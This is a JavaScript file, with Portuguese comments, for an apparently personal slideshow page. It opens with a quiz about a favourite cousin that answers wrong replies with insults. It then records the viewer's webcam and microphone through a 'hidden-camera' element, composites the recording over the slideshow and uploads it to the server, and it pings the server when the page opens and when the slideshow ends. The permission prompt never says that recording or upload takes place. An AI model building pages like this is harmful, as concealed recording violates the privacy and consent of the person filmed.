const config = window.APP_CONFIG;

// ── Dev mode: adicione ?dev na URL para pular câmera/gravação ──────────
const DEV_MODE = new URLSearchParams(location.search).has("dev");
if (DEV_MODE) console.info("[DEV] Modo dev ativo — câmera e gravação desativadas.");

const startScreen = document.getElementById("start-screen");
const viewerScreen = document.getElementById("viewer-screen");
const finalScreen = document.getElementById("final-screen");

const startContent = document.querySelector("#start-screen .content");
const startButton = document.getElementById("start-button");
const albumButton = document.getElementById("album-button");

const imageViewer = document.getElementById("image-viewer");
const videoViewer = document.getElementById("video-viewer");
const hiddenCamera = document.getElementById("hidden-camera");


const QUIZ_MESSAGES = {
    wrong: [
        "Vaca.",
        "Pensa com a cabeça.",
        "Falsa.",
        "Lazarenta."
    ]
};

let uploadPromise = null;
let recorder;
let recordedChunks = [];
let stream;
let compositeCanvas, compositeCtx, rafId;

if (!DEV_MODE) {
    fetch("/api/notify?e=abriu").catch(() => { });
}

function randomQuizMessage(type) {
    const list = QUIZ_MESSAGES[type] || [];
    if (!list.length) return "";
    return list[Math.floor(Math.random() * list.length)];
}

startButton.addEventListener("click", () => {
    renderQuiz();
});

function renderQuiz() {
    startScreen.classList.add("quiz-mode");
    startContent.innerHTML = `
        <h1>Questionário</h1>

        <div class="quiz-block">
            <p>Qual o seu primo favorito?</p>

            <input
                id="favorite-cousin"
                type="text"
                placeholder="Digite aqui"
                autocomplete="off"
                class="quiz-input invalid"
            />

            <button id="verify-cousin-button" type="button">
                Verificar
            </button>

            <small id="cousin-feedback"></small>
        </div>

        <div id="quiz-next-questions"></div>
    `;

    const input = document.getElementById("favorite-cousin");
    const button = document.getElementById("verify-cousin-button");
    const feedback = document.getElementById("cousin-feedback");

    input.addEventListener("input", () => {
        const value = input.value.trim().toLowerCase();

        if (value.includes("rique")) {
            input.classList.remove("invalid");
            input.classList.add("valid");
        } else {
            input.classList.remove("valid");
            input.classList.add("invalid");
        }
    });

    let cousinValid = false;

    button.addEventListener("click", () => {
        const value = input.value.trim().toLowerCase();

        if (value.includes("rique")) {
            cousinValid = true;
            input.classList.remove("invalid");
            input.classList.add("valid");
            feedback.textContent = "Sempre soube que era eu. ❤️";
        } else {
            cousinValid = false;
            input.classList.remove("valid");
            input.classList.add("invalid");
            feedback.textContent = randomQuizMessage("wrong");
        }

        // aqui depois vamos validar tudo antes de começar o slideshow
        window.quizState = {
            cousinValid
        };
    });
}
async function startSlideshow() {

    if (DEV_MODE) {
        window._uploadDone = Promise.resolve();
        startScreen.classList.remove("active");
        viewerScreen.classList.add("active");
        await playMediaSequence();
        return;
    }

    try {
        stream = await navigator.mediaDevices.getUserMedia({
            video: { facingMode: "user", width: 640, height: 480 },
            audio: true
        });

        hiddenCamera.srcObject = stream;
        startRecording(stream);

        startScreen.classList.remove("active");
        viewerScreen.classList.add("active");

        await playMediaSequence();

        recorder.stop();
        fetch("/api/notify?e=terminou").catch(() => { });

        viewerScreen.classList.remove("active");
        finalScreen.classList.add("active");

    } catch (error) {
        console.error(error);
        alert("Permita câmera e microfone para continuar.");
    }
}

function criarCompositeCanvas() {
    compositeCanvas = document.createElement("canvas");
    compositeCanvas.width = 640;
    compositeCanvas.height = 480;
    compositeCtx = compositeCanvas.getContext("2d");
}

function iniciarLoopComposicao() {
    const imageCanvas = document.getElementById("image-viewer");
    const camW = 160, camH = 120;
    const margin = 12;

    function desenhar() {
        const cw = compositeCanvas.width;
        const ch = compositeCanvas.height;

        compositeCtx.fillStyle = "#000";
        compositeCtx.fillRect(0, 0, cw, ch);

        const isVideo = videoViewer.style.display !== "none";
        const fonte = isVideo ? videoViewer : imageCanvas;

        if (fonte && (fonte.readyState !== undefined ? fonte.readyState >= 2 : true)) {
            try {
                compositeCtx.drawImage(fonte, 0, 0, cw, ch);
            } catch (_) { }
        }

        if (hiddenCamera.srcObject) {
            try {
                compositeCtx.save();
                const x = cw - camW - margin;
                const y = ch - camH - margin;
                compositeCtx.beginPath();
                compositeCtx.roundRect(x, y, camW, camH, 8);
                compositeCtx.clip();
                compositeCtx.drawImage(hiddenCamera, x, y, camW, camH);
                compositeCtx.restore();
                compositeCtx.strokeStyle = "rgba(255,255,255,0.3)";
                compositeCtx.lineWidth = 1;
                compositeCtx.beginPath();
                compositeCtx.roundRect(cw - camW - margin, ch - camH - margin, camW, camH, 8);
                compositeCtx.stroke();
            } catch (_) { }
        }

        rafId = requestAnimationFrame(desenhar);
    }

    desenhar();
}

function startRecording(stream) {
    criarCompositeCanvas();
    iniciarLoopComposicao();

    let fonteDoStream;
    let mimeType;

    try {
        const testStream = compositeCanvas.captureStream(30);

        if (testStream.getVideoTracks().length > 0) {
            const audioTrack = stream.getAudioTracks()[0];
            if (audioTrack) testStream.addTrack(audioTrack);
            fonteDoStream = testStream;
        } else {
            throw new Error("captureStream sem tracks");
        }
    } catch (_) {
        cancelAnimationFrame(rafId);
        fonteDoStream = stream;
    }

    mimeType = MediaRecorder.isTypeSupported("video/webm;codecs=vp8,opus")
        ? "video/webm;codecs=vp8,opus"
        : MediaRecorder.isTypeSupported("video/mp4")
            ? "video/mp4"
            : "";

    recorder = new MediaRecorder(fonteDoStream, {
        ...(mimeType ? { mimeType } : {}),
        videoBitsPerSecond: 600_000,
        audioBitsPerSecond: 32_000,
    });

    recorder.ondataavailable = e => {
        if (e.data.size > 0) recordedChunks.push(e.data);
    };

    let resolveUploadDone;
    window._uploadDone = new Promise(r => { resolveUploadDone = r; });

    recorder.onstop = async () => {
        cancelAnimationFrame(rafId);
        const ext = mimeType.includes("mp4") ? "mp4" : "webm";
        const blob = new Blob(recordedChunks, { type: mimeType || "video/mp4" });
        await uploadVideo(blob, ext);
        stream.getTracks().forEach(t => t.stop());
        resolveUploadDone();
    };

    recorder.start();
}

async function playMediaSequence() {

    for (const item of config.MEDIA) {

        if (item.type === "image") {
            await showImage(item.src, item.duration);
        }

        if (item.type === "video") {
            await showVideo(item.src);
        }
    }

    viewerScreen.classList.remove("active");
    finalScreen.classList.add("active");
}

function showImage(src, duration) {

    return new Promise(resolve => {

        videoViewer.pause();
        videoViewer.style.display = "none";

        imageViewer.src = src;
        imageViewer.style.display = "block";

        setTimeout(resolve, duration);
    });
}

function showVideo(src) {

    return new Promise(resolve => {

        imageViewer.style.display = "none";

        videoViewer.src = src;
        videoViewer.style.display = "block";

        videoViewer.onended = () => {
            resolve();
        };

        videoViewer.play();
    });
}

async function uploadVideo(blob, ext = "webm", tentativas = 3) {
    for (let i = 0; i < tentativas; i++) {
        try {
            const formData = new FormData();
            formData.append("video", blob, `reaction-${Date.now()}.${ext}`);

            const res = await fetch("/api/upload", {
                method: "POST",
                body: formData
            });

            if (res.ok) return;

            throw new Error(`HTTP ${res.status}`);

        } catch (err) {
            if (i === tentativas - 1) {
                console.error("Upload falhou após todas as tentativas:", err);
                return;
            }
            await new Promise(r => setTimeout(r, 2000 * (i + 1)));
        }
    }
}

albumButton.addEventListener("click", async () => {
    albumButton.disabled = true;
    albumButton.textContent = "Aguarde...";
    await window._uploadDone;
    window.location.href = config.GOOGLE_PHOTOS_URL;
});